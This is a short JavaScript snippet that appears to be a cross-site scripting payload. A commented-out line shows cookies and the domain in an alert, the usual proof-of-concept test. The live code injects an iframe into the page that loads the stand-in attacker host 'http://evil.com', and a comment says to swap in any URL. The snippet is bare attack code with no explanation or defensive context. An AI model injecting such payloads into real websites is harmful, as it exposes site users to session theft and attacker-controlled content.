// alert(document.domain + "\n" + document.cookie);

var iframe = document.createElement('iframe');
iframe.src = 'http://evil.com'; // replace with the URL you want to load
document.body.appendChild(iframe);
